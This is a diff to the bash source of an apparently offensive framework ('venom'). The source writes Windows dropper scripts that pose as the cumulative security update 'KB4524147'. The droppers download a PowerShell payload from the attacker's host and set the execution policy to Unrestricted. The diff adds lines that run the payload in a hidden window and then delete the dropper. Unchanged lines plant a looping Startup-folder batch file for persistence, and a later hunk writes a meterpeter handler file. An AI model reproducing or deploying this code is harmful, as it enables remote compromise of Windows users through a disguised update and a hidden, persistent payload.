@@ -12588,7 +12588,7 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ] || [ -z "$easter_egg" 
    # DESCRIPTION: dropper.ps1 will write in $env:tmp folder the REAL dropper (KB4524147_4nF7.ps1)
    # then it will execute it in one PS hidden console (to download/execute real payload.ps1 in-memory)..
    echo "<#" > $IPATH/output/$Drop.ps1
-   echo "Framework: venom v1.0.17 (amsi evasion)" >> $IPATH/output/$Drop.ps1
+   echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/$Drop.ps1
    echo "#>" >> $IPATH/output/$Drop.ps1
    echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
    echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
@@ -12792,6 +12792,9 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.bat
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
+   echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.bat
+   echo "Timeout /T 2 >nul && Del /F /Q $Drop.bat" >> $IPATH/output/$Drop.bat # <-- delete script at the end of execution
+   echo "Exit" >> $IPATH/output/$Drop.bat
  else
    ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.bat ..${white}";sleep 2
@@ -12799,7 +12802,6 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "title Cumulative Security Update KB4524147" >> $IPATH/output/$Drop.bat
    echo "echo Please Be Patience While We Search For Available Updates to %USERDOMAIN% System .. " >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.bat
-   ## Setting target PS Execution Policy to 'RemoteSigned' to be abble to exec our agent.ps1 on Startup.
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.bat
    echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.bat
    ## Persistence Module Function (VBScript|BATch)
@@ -12809,10 +12811,10 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
    else
       ## Persistence script execution (minimized terminal prompt) using BATCH script.
       echo "echo @echo off > \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo :: Framework: venom v1.0.17 - shinigami >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
-      echo "echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
+      echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
       echo "echo PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.bat
@@ -13040,6 +13042,9 @@ if [ "$persistence" = "Dont Add Persistence" ]; then
    echo "PoWeRsHeLl Get-HotFix -Description 'Security Update'" >> $IPATH/output/$Drop.$ext.bat
    echo "cmd /R echo Y | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser" >> $IPATH/output/$Drop.$ext.bat
    echo "PoWeRsHeLl -C (nEw-ObJeCt NeT.WebClIeNt).DoWnLoAdFiLe('http://$lhost/$NaM.ps1', '$rpath\\$NaM.ps1')" >> $IPATH/output/$Drop.$ext.bat
+   echo "PoWeRsHeLl -W 1 -File \"$rpath\\$NaM.ps1\"" >> $IPATH/output/$Drop.$ext.bat
+   echo "Timeout /T 2 >nul && Del /F /Q $Drop.$ext.bat" >> $IPATH/output/$Drop.$ext.bat # <-- delete script at the end of execution
+   echo "Exit" >> $IPATH/output/$Drop.$ext.bat
 else
    ## Special thanks to: [ @codings9 ] for all the help provided in debug this function on windows10..
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Persistence active on: $Drop.$ext.bat ..${white}";sleep 2
@@ -13060,7 +13065,7 @@ else
       echo "echo :: Framework: venom v1.0.17 (amsi evasion) >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start \"\" /min \"%%~dpnx0\" %%* ^&^& exit >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo title Cumulative Security Update KB4524147 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
-      echo "echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
+      echo "echo echo Please wait, Updating system .. >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo :STARTLOOP >> \"%appdata%\\Microsoft\\Windows\\Start Menu\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo timeout /T 8 /NOBREAK ^>nul >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
       echo "echo PoWeRsHeLl -W 1 -File $rpath\\$NaM.ps1 >> \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\KB4524147_$random_name.update.bat\"" >> $IPATH/output/$Drop.$ext.bat
@@ -13292,9 +13297,6 @@ if [ -e "$IPATH/bin/meterpeter/Update-KB4524147.ps1" ]; then
    random_name=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 6 | head -n 1)
    ## Write handler file to venom output folder
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Handler:${GreenF} $IPATH/output/meterpeter_$random_name.handler"${Reset};sleep 2
-   echo "+----------------------------------+" > $IPATH/output/meterpeter_$random_name.handler
-   echo "| meterpeter - Persistence Handler |" >> $IPATH/output/meterpeter_$random_name.handler
-   echo "+----------------------------------+" >> $IPATH/output/meterpeter_$random_name.handler
    echo "LPORT  :$lport" >> $IPATH/output/meterpeter_$random_name.handler
    echo "LHOST  :$lhost" >> $IPATH/output/meterpeter_$random_name.handler
    echo "DATE   :$dtr" >> $IPATH/output/meterpeter_$random_name.handler
